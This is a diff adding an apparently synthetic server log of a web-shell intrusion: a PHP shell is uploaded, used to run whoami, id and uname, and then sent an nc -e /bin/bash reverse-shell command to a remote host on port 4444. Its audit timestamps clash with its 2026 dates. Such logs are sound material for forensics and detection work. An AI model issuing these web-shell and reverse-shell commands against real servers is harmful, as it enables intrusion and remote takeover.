@@ -1,0 +1,16 @@
+Feb 15 12:40:01 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:01 +0000] "POST /upload.php HTTP/1.1" 200 742 "-" "Mozilla/5.0"
+Feb 15 12:40:01 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:01 +0000] "POST /upload.php HTTP/1.1" 200 742 "-" "Content-Disposition: form-data; name="file"; filename="shell.php""
+
+Feb 15 12:40:02 webserver audit[4123]: SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0="/var/www/html/uploads/shell.php" a1=O_WRONLY|O_CREAT a2=0644
+Feb 15 12:40:02 webserver audit[4123]: PATH item=0 name="/var/www/html/uploads/shell.php" inode=393482 dev=08:01 mode=0100644 ouid=33 ogid=33
+
+Feb 15 12:40:05 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:05 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 124 "-" "curl/7.68.0"
+Feb 15 12:40:06 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:06 +0000] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 132 "-" "curl/7.68.0"
+Feb 15 12:40:07 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:07 +0000] "GET /uploads/shell.php?cmd=uname -a HTTP/1.1" 200 256 "-" "curl/7.68.0"
+
+Feb 15 12:40:08 webserver kernel: [12355.778901] audit: type=EXECVE msg=audit(1708000808.321:511): argc=3 a0="/bin/sh" a1="-c" a2="whoami"
+Feb 15 12:40:08 webserver kernel: [12355.778905] audit: type=EXECVE msg=audit(1708000808.322:512): argc=3 a0="/bin/sh" a1="-c" a2="id"
+
+Feb 15 12:40:10 webserver apache2: 203.0.113.180 - - [15/Feb/2026:12:40:10 +0000] "GET /uploads/shell.php?cmd=nc -e /bin/bash 203.0.113.200 4444 HTTP/1.1" 200 310 "-" "curl/7.68.0"
+
+Feb 15 12:40:12 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=203.0.113.200 LEN=60 TOS=0x00 TTL=64 ID=71001 PROTO=TCP SPT=40222 DPT=4444
